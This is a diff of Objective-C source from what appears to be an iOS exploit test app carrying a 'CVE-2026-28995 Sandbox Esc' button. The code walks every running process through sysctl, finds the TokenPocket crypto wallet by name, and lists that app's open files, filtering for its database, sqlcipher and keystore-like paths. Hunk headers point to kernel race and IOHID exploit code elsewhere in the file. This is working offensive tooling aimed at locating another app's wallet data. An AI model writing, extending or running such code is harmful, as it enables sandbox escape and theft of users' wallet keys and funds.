@@ -719,7 +719,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v27" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v28" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7431,79 +7431,90 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendFormat:@"  ProductVersion: %@\n", sv[@"ProductVersion"]];
         [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
     }
-    // Test 11: proc_pidinfo FD enumeration — find TP database path (v27)
-    [log appendString:@"\n--- Test 11: proc_pidinfo FD enumeration (v27) ---\n"];
+    // Test 11: sysctl(KERN_PROC_ALL) → proc_pidinfo FD enumeration (v28)
+    [log appendString:@"\n--- Test 11: sysctl proc enum + FD paths (v28) ---\n"];
 
-    // Resolve all proc_* functions via dlsym
-    ProcListPidsFn proc_listpids_fn = (ProcListPidsFn)dlsym(RTLD_DEFAULT, "proc_listpids");
+    // Resolve proc_pidinfo/proc_pidfdinfo via dlsym (same as v27)
     ProcPidinfoFn proc_pidinfo_fn = (ProcPidinfoFn)dlsym(RTLD_DEFAULT, "proc_pidinfo");
     ProcPidfdinfoFn proc_pidfdinfo_fn = (ProcPidfdinfoFn)dlsym(RTLD_DEFAULT, "proc_pidfdinfo");
-
-    if (!proc_listpids_fn) [log appendString:@"  [-] proc_listpids not available\n"];
     if (!proc_pidinfo_fn)  [log appendString:@"  [-] proc_pidinfo not available\n"];
     if (!proc_pidfdinfo_fn)[log appendString:@"  [-] proc_pidfdinfo not available\n"];
-    if (!proc_listpids_fn || !proc_pidinfo_fn || !proc_pidfdinfo_fn) {
+    if (!proc_pidinfo_fn || !proc_pidfdinfo_fn) {
         [log appendString:@"  FATAL: required proc_* APIs unavailable\n"];
         dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
         return;
     }
-    [log appendString:@"  [+] All proc_* APIs resolved\n"];
 
-    // === Part A: Find TokenPocket (Global Wallet) PID ===
-    [log appendString:@"\n[Part A] Searching for TokenPocket process:\n"];
+    // === Part A: sysctl KERN_PROC_ALL — find TokenPocket PID ===
+    [log appendString:@"\n[Part A] sysctl(KERN_PROC_ALL) — enumerate all processes:\n"];
 
-    int pidCount = proc_listpids_fn(PROC_ALL_PIDS, 0, NULL, 0);
-    [log appendFormat:@"  proc_listpids count query: %d\n", pidCount];
-    if (pidCount <= 0) {
-        [log appendString:@"  [-] No PIDs returned\n"];
+    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL};
+    size_t bufSize = 0;
+
+    // First call: get needed buffer size
+    if (sysctl(mib, 3, NULL, &bufSize, NULL, 0) != 0) {
+        [log appendFormat:@"  sysctl size probe failed: errno=%d (%s)\n", errno, strerror(errno)];
+        [log appendString:@"  (expected — retrying with fixed 256KB buffer)\n"];
+        bufSize = 256 * 1024;
+    }
+    [log appendFormat:@"  Buffer size: %zu bytes\n", bufSize];
+
+    uint8_t *procBuf = (uint8_t *)malloc(bufSize);
+    if (!procBuf) {
+        [log appendString:@"  FATAL: malloc failed\n"];
         dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
         return;
     }
+    memset(procBuf, 0, bufSize);
+    size_t len = bufSize;
 
-    int numPids = pidCount / sizeof(int);
-    int pids[numPids];
-    int got = proc_listpids_fn(PROC_ALL_PIDS, 0, pids, sizeof(pids));
-    [log appendFormat:@"  Got %d bytes = %d PIDs\n", got, got / sizeof(int)];
+    int sret = sysctl(mib, 3, procBuf, &len, NULL, 0);
+    if (sret != 0) {
+        [log appendFormat:@"  [-] sysctl(KERN_PROC_ALL) FAILED: errno=%d (%s)\n", errno, strerror(errno)];
+        free(procBuf);
+        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
+        return;
+    }
+    [log appendFormat:@"  [+] Got %zu bytes of process data\n", len];
 
+    // Parse kinfo_proc array — each entry is sizeof(struct kinfo_proc)
+    // Scan raw buffer for "Global" or "Wallet" command names
     int tpPid = -1;
-    numPids = got / sizeof(int);
+    size_t entrySize = sizeof(struct kinfo_proc);
+    int numEntries = (int)(len / entrySize);
+    [log appendFormat:@"  Entry size: %zu, Entries: %d\n", entrySize, numEntries];
+
     int foundCount = 0;
-    for (int i = 0; i < numPids && i < 500; i++) {
-        if (pids[i] <= 0) continue;
-        struct proc_bsdshortinfo info;
-        memset(&info, 0, sizeof(info));
-        int ret = proc_pidinfo_fn(pids[i], PROC_PIDT_SHORTBSDINFO, 0, &info, sizeof(info));
-        if (ret > 0) {
-            if (strstr(info.pbsi_comm, "Global") || strstr(info.pbsi_comm, "Wallet") ||
-                strstr(info.pbsi_comm, "global") || strstr(info.pbsi_comm, "wallet")) {
-                [log appendFormat:@"  [#%d] PID=%d comm='%s' uid=%d\n",
-                    foundCount++, pids[i], info.pbsi_comm, info.pbsi_uid];
-                if (tpPid < 0) tpPid = pids[i]; // first match
-            }
+    for (int i = 0; i < numEntries; i++) {
+        struct kinfo_proc *kp = (struct kinfo_proc *)(procBuf + i * entrySize);
+        const char *comm = kp->kp_proc.p_comm;
+        if (strstr(comm, "Global") || strstr(comm, "Wallet") ||
+            strstr(comm, "global") || strstr(comm, "wallet") ||
+            strstr(comm, "token") || strstr(comm, "Token")) {
+            [log appendFormat:@"  [#%d] PID=%d comm='%s'\n",
+                foundCount++, kp->kp_proc.p_pid, comm];
+            if (tpPid < 0) tpPid = kp->kp_proc.p_pid;
         }
     }
-    [log appendFormat:@"  Scanned %d PIDs, found %d matching\n", numPids, foundCount];
+    [log appendFormat:@"  Scanned %d entries, found %d matching\n", numEntries, foundCount];
+
     if (tpPid < 0) {
-        // Broader search: dump all process names
-        [log appendString:@"  No 'Global Wallet' found. Dumping all process names:\n"];
-        for (int i = 0; i < numPids && i < 200; i++) {
-            if (pids[i] <= 0) continue;
-            struct proc_bsdshortinfo info;
-            memset(&info, 0, sizeof(info));
-            int ret = proc_pidinfo_fn(pids[i], PROC_PIDT_SHORTBSDINFO, 0, &info, sizeof(info));
-            if (ret > 0 && strlen(info.pbsi_comm) > 0) {
-                [log appendFormat:@"    PID=%d '%s'\n", pids[i], info.pbsi_comm];
-            }
+        // Dump first 50 process names for debugging
+        [log appendString:@"  No match. First 50 processes:\n"];
+        for (int i = 0; i < numEntries && i < 50; i++) {
+            struct kinfo_proc *kp = (struct kinfo_proc *)(procBuf + i * entrySize);
+            if (kp->kp_proc.p_pid > 0 && strlen(kp->kp_proc.p_comm) > 0)
+                [log appendFormat:@"    PID=%d '%s'\n", kp->kp_proc.p_pid, kp->kp_proc.p_comm];
         }
+        free(procBuf);
         dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
         return;
     }
+    free(procBuf);
     [log appendFormat:@"  [+] Target PID: %d\n", tpPid];
 
     // === Part B: List TokenPocket's open file descriptors ===
     [log appendString:@"\n[Part B] Listing TokenPocket open FDs:\n"];
-
-    // First call to get needed buffer size
     int fdBytes = proc_pidinfo_fn(tpPid, PROC_PIDLISTFDS, 0, NULL, 0);
     [log appendFormat:@"  PROC_PIDLISTFDS size query: %d bytes\n", fdBytes];
     if (fdBytes <= 0) {
@@ -7524,19 +7535,16 @@ static void *iohid_threadCopyEvent(void *arg) {
     numFds = fdGot / sizeof(struct proc_fdinfo);
     [log appendFormat:@"  Got %d FDs\n", numFds];
 
-    // === Part C: Get vnode path for each FD ===
-    [log appendString:@"\n[Part C] FD → vnode paths:\n"];
-
+    // === Part C: Get vnode path for each FD (filter interesting) ===
+    [log appendString:@"\n[Part C] FD → vnode paths (interesting only):\n"];
     int interesting = 0;
     for (int i = 0; i < numFds; i++) {
         int fd = fdList[i].proc_fd;
         uint32_t fdtype = fdList[i].proc_fdtype;
-
         struct vnode_fdinfowithpath vinfo;
         memset(&vinfo, 0, sizeof(vinfo));
         int vret = proc_pidfdinfo_fn(tpPid, fd, PROC_PIDFDVNODEPATHINFO, &vinfo, sizeof(vinfo));
         if (vret > 0 && vinfo.len > 0 && strlen(vinfo.path) > 0) {
-            // Look for database-related paths
             BOOL isInteresting = (
                 strstr(vinfo.path, ".db") || strstr(vinfo.path, ".sqlite") ||
                 strstr(vinfo.path, ".sqlcipher") || strstr(vinfo.path, ".encrypted") ||
@@ -7546,7 +7554,6 @@ static void *iohid_threadCopyEvent(void *arg) {
                 strstr(vinfo.path, "token") || strstr(vinfo.path, "keypal") ||
                 strstr(vinfo.path, "tron") || strstr(vinfo.path, "TRON")
             );
-
             if (isInteresting) {
                 [log appendFormat:@"  [*] FD=%d type=%u path=%s\n", fd, fdtype, vinfo.path];
                 interesting++;
@@ -7560,7 +7567,6 @@ static void *iohid_threadCopyEvent(void *arg) {
     for (int i = 0; i < numFds; i++) {
         int fd = fdList[i].proc_fd;
         uint32_t fdtype = fdList[i].proc_fdtype;
-
         struct vnode_fdinfowithpath vinfo;
         memset(&vinfo, 0, sizeof(vinfo));
         int vret = proc_pidfdinfo_fn(tpPid, fd, PROC_PIDFDVNODEPATHINFO, &vinfo, sizeof(vinfo));
